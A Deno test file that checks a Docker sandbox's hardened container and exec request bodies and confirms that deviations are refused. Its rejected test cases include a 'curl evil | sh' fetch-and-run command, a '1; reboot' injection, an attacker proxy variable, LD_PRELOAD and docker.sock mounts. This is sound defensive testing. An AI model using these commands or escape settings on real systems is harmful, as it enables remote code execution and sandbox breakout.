import { assert, assertEquals, assertNotEquals, assertStringIncludes, assertThrows } from '@std/assert';
import { BASE_ENV, proxyEnv } from './cage.ts';
import {
	BodyRefused,
	canonicalJson,
	checkCreateBody,
	checkExecBody,
	CLEANUP_SCRIPT,
	COMMAND_BODY,
	containerBody,
	containerName,
	type CreateFor,
	createFor,
	deploymentId,
	execBody,
	FORBIDDEN_FIELDS,
	innerScript,
	KILL_SCRIPT,
	type WorkspaceTarget,
	WRAPPER,
} from './docker_spec.ts';

const RUN = '0f0e8c6a-3d2b-4c1a-9e8f-7a6b5c4d3e2f';
const OWNER = 'a'.repeat(64);
const DEPLOYMENT = await deploymentId('ttk-code');
const BASE: WorkspaceTarget = {
	policy: { image: 'tykotech-sandbox-workspace:0.2.0', volume: 'ttk-code', sockVolume: 'ttk-sandbox-sock' },
	runId: RUN,
	owner: OWNER,
	git: true,
	deployment: DEPLOYMENT,
};
const TARGET: CreateFor = await createFor(BASE);

const clone = <T>(value: T): T => structuredClone(value);
type Body = Record<string, unknown> & { HostConfig: Record<string, unknown> };

/** The exact body of design §2.13, spelled out rather than rebuilt, so a change to it shows up here. */
const EXPECTED = {
	Image: 'tykotech-sandbox-workspace:0.2.0',
	User: '1993:1993',
	Cmd: ['sleep', 'infinity'],
	Env: Object.entries(BASE_ENV).map(([k, v]) => `${k}=${v}`),
	WorkingDir: '/workspace',
	Labels: {
		'eu.tykotech.sandbox': '1',
		'eu.tykotech.workspace': RUN,
		'eu.tykotech.owner': OWNER,
		'eu.tykotech.deployment': DEPLOYMENT,
		'eu.tykotech.body': TARGET.bodyHash,
	},
	HostConfig: {
		Mounts: [
			{
				Type: 'volume' as const,
				Source: 'ttk-code',
				Target: '/workspace',
				ReadOnly: false,
				VolumeOptions: { NoCopy: true as const, Subpath: RUN },
			},
			{
				Type: 'volume' as const,
				Source: 'ttk-code',
				Target: '/workspace/.git',
				ReadOnly: true,
				VolumeOptions: { NoCopy: true as const, Subpath: `${RUN}/.git` },
			},
			{
				Type: 'volume' as const,
				Source: 'ttk-code',
				Target: '/home/sandbox',
				ReadOnly: false,
				VolumeOptions: { NoCopy: true as const, Subpath: `.sandbox/${RUN}/home` },
			},
			{
				// R2-1: read-only; the workspace only connects to the proxy's socket here.
				Type: 'volume' as const,
				Source: 'ttk-sandbox-sock',
				Target: '/run/harbour',
				ReadOnly: true,
				VolumeOptions: { NoCopy: true as const, Subpath: RUN },
			},
		],
		NetworkMode: 'none' as const,
		ReadonlyRootfs: true as const,
		Tmpfs: { '/tmp': 'rw,nosuid,nodev,size=256m' },
		CapDrop: ['ALL'],
		SecurityOpt: ['no-new-privileges:true'],
		Privileged: false as const,
		Memory: 1073741824,
		MemorySwap: 1073741824,
		NanoCpus: 1000000000,
		PidsLimit: 200,
		Init: true as const,
	},
};

Deno.test('AC6 docker body: the create body is exactly the hardened one, and passes its own check', async () => {
	assertEquals(containerBody(TARGET), EXPECTED);
	assertEquals(checkCreateBody(clone(EXPECTED), TARGET), EXPECTED);
	// The provisioning container, before `git init`, mounts no .git; the rest is the same.
	const unprovisioned = await createFor({ ...BASE, git: false });
	const provisioning = containerBody(unprovisioned);
	assertEquals(provisioning.HostConfig.Mounts.map((m) => m.Target), ['/workspace', '/home/sandbox', '/run/harbour']);
	checkCreateBody(provisioning, unprovisioned);
	// A body for one workspace is no body for another, nor for the other mount set: its hash label already differs,
	// and so, compared on their own, do its mounts.
	assertThrows(() => checkCreateBody(clone(EXPECTED), unprovisioned), BodyRefused, 'Labels');
	assertThrows(
		() => checkCreateBody(clone(EXPECTED), { ...unprovisioned, bodyHash: TARGET.bodyHash }),
		BodyRefused,
		'HostConfig.Mounts',
	);
	assertThrows(
		() => checkCreateBody(clone(EXPECTED), { ...TARGET, runId: '11111111-2222-4333-8444-555555555555' }),
		BodyRefused,
		'Labels',
	);
});

Deno.test('R2-1 docker body: only the workspace and its home are writable; the socket folder is read-only', () => {
	const sockets = containerBody(TARGET).HostConfig.Mounts.filter((m) => m.Target === '/run/harbour');
	assertEquals(sockets.map((m) => m.ReadOnly), [true]);
	assertEquals(
		containerBody(TARGET).HostConfig.Mounts.filter((m) => !m.ReadOnly).map((m) => m.Target),
		['/workspace', '/home/sandbox'],
	);
	// Named on its own, not only by comparison with the fixed body: a writable socket folder is refused by name.
	const writable = clone(EXPECTED) as Body;
	(writable.HostConfig.Mounts as Array<Record<string, unknown>>)[3]!.ReadOnly = false;
	assertThrows(() => checkCreateBody(writable, TARGET), BodyRefused, 'may write only the workspace and its home');
	const absent = clone(EXPECTED) as Body;
	delete (absent.HostConfig.Mounts as Array<Record<string, unknown>>)[1]!.ReadOnly;
	assertThrows(() => checkCreateBody(absent, TARGET), BodyRefused, 'may write only the workspace and its home');
});

Deno.test('R2-5 docker body: containers are named and labelled by deployment, derived from the code volume', async () => {
	assert(/^[0-9a-f]{16}$/.test(DEPLOYMENT));
	assertEquals(await deploymentId('ttk-code'), DEPLOYMENT);
	assertNotEquals(await deploymentId('staging_ttk-code'), DEPLOYMENT);
	assertEquals(containerName(DEPLOYMENT, RUN), `ttk-sandbox-${DEPLOYMENT}-${RUN}`);
	assert(/^[A-Za-z0-9][A-Za-z0-9_.-]{0,127}$/.test(containerName(DEPLOYMENT, RUN)), 'a Docker name');
	assertThrows(
		() => checkCreateBody(clone(EXPECTED), { ...TARGET, deployment: 'ttk-code' }),
		BodyRefused,
		'deployment',
	);
	assertThrows(
		() => checkCreateBody(clone(EXPECTED), { ...TARGET, deployment: 'b'.repeat(16) }),
		BodyRefused,
		'Labels differs',
	);
});

Deno.test('R2-6 docker body: the body carries the hash of everything else in it', async () => {
	assert(/^[0-9a-f]{64}$/.test(TARGET.bodyHash));
	assertEquals(EXPECTED.Labels['eu.tykotech.body'], TARGET.bodyHash);
	// Stable, whatever order a body's keys were built in.
	assertEquals((await createFor(BASE)).bodyHash, TARGET.bodyHash);
	assertEquals(canonicalJson({ b: 1, a: [{ d: 2, c: 3 }] }), '{"a":[{"c":3,"d":2}],"b":1}');
	// Any change to what the body says changes the hash: the image, the owner, the mounts.
	for (
		const other of [
			{ ...BASE, policy: { ...BASE.policy, image: 'tykotech-sandbox-workspace:0.2.1' } },
			{ ...BASE, owner: 'b'.repeat(64) },
			{ ...BASE, git: false },
			{ ...BASE, policy: { ...BASE.policy, sockVolume: 'other-sock' } },
		]
	) assertNotEquals((await createFor(other)).bodyHash, TARGET.bodyHash);
	assertThrows(() => checkCreateBody(clone(EXPECTED), { ...TARGET, bodyHash: 'nope' }), BodyRefused, 'body hash');
	const stale = clone(EXPECTED) as Body;
	(stale.Labels as Record<string, string>)['eu.tykotech.body'] = 'f'.repeat(64);
	assertThrows(() => checkCreateBody(stale, TARGET), BodyRefused, 'Labels differs');
});

Deno.test('AC6 docker body: every forbidden field is refused, at the top and in HostConfig, whatever its value', () => {
	assertEquals(FORBIDDEN_FIELDS.length, 16);
	for (const field of FORBIDDEN_FIELDS) {
		for (const value of [true, [], {}, 'host', 'private', 1]) {
			const inHost = clone(EXPECTED) as Body;
			inHost.HostConfig[field] = value;
			assertThrows(() => checkCreateBody(inHost, TARGET), BodyRefused, `HostConfig.${field} is forbidden`);
			const atTop = clone(EXPECTED) as Body;
			atTop[field] = value;
			assertThrows(() => checkCreateBody(atTop, TARGET), BodyRefused, `${field} is forbidden`);
		}
	}
});

Deno.test('AC6 docker body: a field outside the allowlist is refused', () => {
	for (const field of ['Entrypoint', 'Volumes', 'ExposedPorts', 'Hostname', 'Tty', 'OpenStdin', 'NetworkingConfig']) {
		const body = clone(EXPECTED) as Body;
		body[field] = field === 'Entrypoint' ? ['/bin/sh'] : {};
		assertThrows(() => checkCreateBody(body, TARGET), BodyRefused, field);
	}
	for (const field of ['AutoRemove', 'OomKillDisable', 'Dns', 'Mounts2', 'CgroupParent', 'MaskedPaths', 'Cgroup']) {
		const body = clone(EXPECTED) as Body;
		body.HostConfig[field] = field === 'OomKillDisable' ? true : [];
		assertThrows(() => checkCreateBody(body, TARGET), BodyRefused, `HostConfig.${field}`);
	}
});

Deno.test('AC6 docker body: every fixed value, changed, is refused', () => {
	const changes: Array<[string, (b: Body) => void]> = [
		['Image', (b) => b.Image = 'tykotech-sandbox-workspace:latest'],
		['User', (b) => b.User = '0:0'],
		['User', (b) => b.User = 'root'],
		['Cmd', (b) => b.Cmd = ['/bin/sh']],
		['Env', (b) => b.Env = [...(b.Env as string[]), 'LD_PRELOAD=/x.so']],
		['Env', (b) => b.Env = (b.Env as string[]).slice(1)],
		['WorkingDir', (b) => b.WorkingDir = '/'],
		['Labels', (b) => b.Labels = { ...b.Labels as object, 'eu.tykotech.owner': 'b'.repeat(64) }],
		['Labels', (b) => b.Labels = { ...b.Labels as object, extra: '1' }],
		['HostConfig.NetworkMode', (b) => b.HostConfig.NetworkMode = 'host'],
		['HostConfig.NetworkMode', (b) => b.HostConfig.NetworkMode = 'bridge'],
		['HostConfig.ReadonlyRootfs', (b) => b.HostConfig.ReadonlyRootfs = false],
		['HostConfig.Tmpfs', (b) => b.HostConfig.Tmpfs = { '/tmp': 'rw,exec,size=10g' }],
		['HostConfig.Tmpfs', (b) => b.HostConfig.Tmpfs = { '/tmp': 'rw,nosuid,nodev,size=256m', '/dev/shm': 'rw' }],
		['HostConfig.CapDrop', (b) => b.HostConfig.CapDrop = []],
		['HostConfig.CapDrop', (b) => b.HostConfig.CapDrop = ['NET_RAW']],
		['HostConfig.SecurityOpt', (b) => b.HostConfig.SecurityOpt = []],
		['HostConfig.SecurityOpt', (b) => b.HostConfig.SecurityOpt = ['no-new-privileges:true', 'seccomp=unconfined']],
		['HostConfig.SecurityOpt', (b) => b.HostConfig.SecurityOpt = ['apparmor=unconfined']],
		['HostConfig.SecurityOpt', (b) => b.HostConfig.SecurityOpt = ['label=disable']],
		['HostConfig.Privileged', (b) => b.HostConfig.Privileged = true],
		['HostConfig.Privileged', (b) => delete b.HostConfig.Privileged],
		['HostConfig.Memory', (b) => b.HostConfig.Memory = 0],
		['HostConfig.MemorySwap', (b) => b.HostConfig.MemorySwap = -1],
		['HostConfig.NanoCpus', (b) => b.HostConfig.NanoCpus = 8e9],
		['HostConfig.PidsLimit', (b) => b.HostConfig.PidsLimit = -1],
		['HostConfig.Init', (b) => b.HostConfig.Init = false],
		['HostConfig.Mounts', (b) => (b.HostConfig.Mounts as unknown[]).pop()],
		['HostConfig.Mounts', (b) => (b.HostConfig.Mounts as Array<Record<string, unknown>>)[1]!.ReadOnly = false],
		['HostConfig.Mounts', (b) => (b.HostConfig.Mounts as Array<Record<string, unknown>>)[0]!.Type = 'bind'],
		['HostConfig.Mounts', (b) => (b.HostConfig.Mounts as Array<Record<string, unknown>>)[0]!.Source = '/'],
		['HostConfig.Mounts', (b) => {
			(b.HostConfig.Mounts as Array<Record<string, unknown>>)[0]!.VolumeOptions = { NoCopy: true, Subpath: '..' };
		}],
		['HostConfig.Mounts', (b) => {
			(b.HostConfig.Mounts as Array<Record<string, unknown>>)[0]!.VolumeOptions = { NoCopy: true, Subpath: '/etc' };
		}],
		['HostConfig.Mounts', (b) => {
			(b.HostConfig.Mounts as Array<Record<string, unknown>>)[0]!.VolumeOptions = { NoCopy: true, Subpath: '.owners' };
		}],
		['HostConfig.Mounts', (b) => {
			(b.HostConfig.Mounts as unknown[]).push({
				Type: 'volume' as const,
				Source: 'ttk-code',
				Target: '/owners',
				ReadOnly: true,
				VolumeOptions: { NoCopy: true as const, Subpath: '.owners' },
			});
		}],
		['HostConfig.Mounts', (b) => {
			(b.HostConfig.Mounts as unknown[]).push({ Type: 'bind', Source: '/var/run/docker.sock', Target: '/s' });
		}],
	];
	for (const [field, change] of changes) {
		const body = clone(EXPECTED) as Body;
		change(body);
		const refused = assertThrows(() => checkCreateBody(body, TARGET), BodyRefused);
		assertStringIncludes(refused.field, field, `${field}: ${refused.message}`);
	}
	// CgroupnsMode other than private is forbidden; never sent at all, it is refused even as private.
	const cgroup = clone(EXPECTED) as Body;
	cgroup.HostConfig.CgroupnsMode = 'host';
	assertThrows(() => checkCreateBody(cgroup, TARGET), BodyRefused, 'CgroupnsMode');
	assertThrows(() => checkCreateBody(null, TARGET), BodyRefused, 'body');
	assertThrows(() => checkCreateBody({ ...clone(EXPECTED), HostConfig: [] }, TARGET), BodyRefused, 'HostConfig');
	assertThrows(() => checkCreateBody(clone(EXPECTED), { ...TARGET, owner: 'not-a-hash' }), BodyRefused, 'owner');
});

function command(over: Partial<{ env: Record<string, string>; workdir: string; stdin: boolean; args: string[] }> = {}) {
	return execBody({
		cmd: [WRAPPER, 'harbour-sandbox', innerScript(COMMAND_BODY), ...(over.args ?? ['npm test'])],
		env: { ...BASE_ENV, ...over.env },
		workdir: over.workdir ?? '/workspace',
		stdin: over.stdin ?? false,
	});
}

Deno.test('AC6 docker exec: the exec body holds the fixed fields only, and passes its check', () => {
	const body = command({ env: { FOO: 'bar', CI: '0' }, workdir: '/workspace/src/app', stdin: true });
	assertEquals(Object.keys(body).sort(), [
		'AttachStderr',
		'AttachStdin',
		'AttachStdout',
		'Cmd',
		'Env',
		'Privileged',
		'Tty',
		'User',
		'WorkingDir',
	]);
	assertEquals(
		[body.User, body.Privileged, body.Tty, body.AttachStdin, body.AttachStdout, body.AttachStderr],
		['1993:1993', false, false, true, true, true],
	);
	assertEquals(body.Cmd.slice(0, 4), ['/bin/sh', '-c', WRAPPER, 'harbour-sandbox']);
	assertEquals(body.Cmd.at(-1), 'npm test');
	assert(
		body.Env.includes('FOO=bar') && body.Env.includes('CI=0') && body.Env.includes('PATH=/usr/local/bin:/usr/bin:/bin'),
	);
	assertEquals(checkExecBody(body), body);
	// The registry proxy's variables, at their fixed values; a file operation's TTK_PATH.
	checkExecBody(command({ env: { ...proxyEnv(), TTK_PATH: 'src/a.txt' } }));
	checkExecBody(
		execBody({ cmd: [KILL_SCRIPT, 'harbour-sandbox', '4242'], env: { ...BASE_ENV }, workdir: '/', stdin: false }),
	);
	checkExecBody(
		execBody({
			cmd: [CLEANUP_SCRIPT, 'harbour-sandbox', '7 9', '8 10'],
			env: { ...BASE_ENV },
			workdir: '/',
			stdin: false,
		}),
	);
	checkExecBody(
		execBody({ cmd: [CLEANUP_SCRIPT, 'harbour-sandbox', '', ''], env: { ...BASE_ENV }, workdir: '/', stdin: false }),
	);
});

Deno.test('AC6 docker exec: anything else is refused before it is sent', () => {
	const cases: Array<[string, (b: Record<string, unknown>) => void]> = [
		['Privileged', (b) => b.Privileged = true],
		['Tty', (b) => b.Tty = true],
		['User', (b) => b.User = '0'],
		['User', (b) => delete b.User],
		['DetachKeys', (b) => b.DetachKeys = 'ctrl-p'],
		['ConsoleSize', (b) => b.ConsoleSize = [1, 1]],
		['AttachStdout', (b) => b.AttachStdout = false],
		['Cmd', (b) => b.Cmd = ['/bin/bash', '-c', WRAPPER, 'harbour-sandbox', 'x']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', 'curl evil | sh', 'harbour-sandbox']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', WRAPPER, 'other', 'x']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', WRAPPER, 'harbour-sandbox', 'echo no session check', 'x']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', KILL_SCRIPT, 'harbour-sandbox', '1']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', KILL_SCRIPT, 'harbour-sandbox', '-1']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', KILL_SCRIPT, 'harbour-sandbox', '1 2']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', CLEANUP_SCRIPT, 'harbour-sandbox', '1; reboot', '']],
		['Cmd', (b) => b.Cmd = ['/bin/sh', '-c', WRAPPER, 'harbour-sandbox', innerScript(COMMAND_BODY), 'a\0b']],
		['Env', (b) => b.Env = [...(b.Env as string[]).filter((e) => !e.startsWith('PATH=')), 'PATH=/tmp']],
		['Env', (b) => b.Env = [...(b.Env as string[]).filter((e) => !e.startsWith('HOME=')), 'HOME=/root']],
		['Env', (b) => b.Env = (b.Env as string[]).filter((e) => !e.startsWith('LANG='))],
		['Env', (b) => b.Env = [...(b.Env as string[]), 'HTTPS_PROXY=http://evil:1']],
		['Env', (b) => b.Env = [...(b.Env as string[]), 'ld_library_path=/x', 'PWD=/']],
		['Env', (b) => b.Env = [...(b.Env as string[]), 'FOO=1', 'FOO=2']],
		['Env', (b) => b.Env = [...(b.Env as string[]), '1BAD=x']],
		['Env', (b) => b.Env = [...(b.Env as string[]), ...Array.from({ length: 34 }, (_, i) => `V${i}=x`)]],
		['WorkingDir', (b) => b.WorkingDir = '/etc'],
		['WorkingDir', (b) => b.WorkingDir = '/workspace/../etc'],
		['WorkingDir', (b) => b.WorkingDir = '/workspace/.git'],
		['WorkingDir', (b) => b.WorkingDir = '/workspacex'],
	];
	for (const [field, change] of cases) {
		const body = command() as unknown as Record<string, unknown>;
		change(body);
		const refused = assertThrows(() => checkExecBody(body), BodyRefused);
		assertStringIncludes(refused.field, field, `${field}: ${refused.message}`);
	}
});

Deno.test('docker scripts: the work gets a session of its own; no per-uid process limit; the command stays an argument', () => {
	const inner = innerScript(COMMAND_BODY, { proxy: true, noGrowth: true });
	assert(inner.startsWith('read -r s </proc/$$/stat'));
	assertStringIncludes(inner, 'exec </dev/null');
	assertStringIncludes(inner, 'UNIX-CONNECT:/run/harbour/proxy.sock');
	assertStringIncludes(inner, 'ulimit -f 0');
	assert(!/ulimit -p/.test(inner), 'RLIMIT_NPROC would count every uid-1993 process on the host');
	assert(inner.endsWith('exec /bin/sh -c "$1"'));
	assert(!innerScript(COMMAND_BODY, { stdin: true }).includes('exec </dev/null'));
	assertStringIncludes(WRAPPER, 'setsid /bin/sh -c "$s" harbour-sandbox "$@"');
	// N3: the cleanup spares PID 1's own session and the live execs, and starts nothing it could kill.
	assertStringIncludes(CLEANUP_SCRIPT, '</proc/1/stat');
	// Arithmetic `$((…))` is a builtin; command substitution `$(…)` or backticks would fork.
	assert(!/\$\((?!\()|`/.test(CLEANUP_SCRIPT), 'no command substitution');
	assertEquals(KILL_SCRIPT.split('\n')[0], 'kill -KILL "-$1" 2>/dev/null');
});
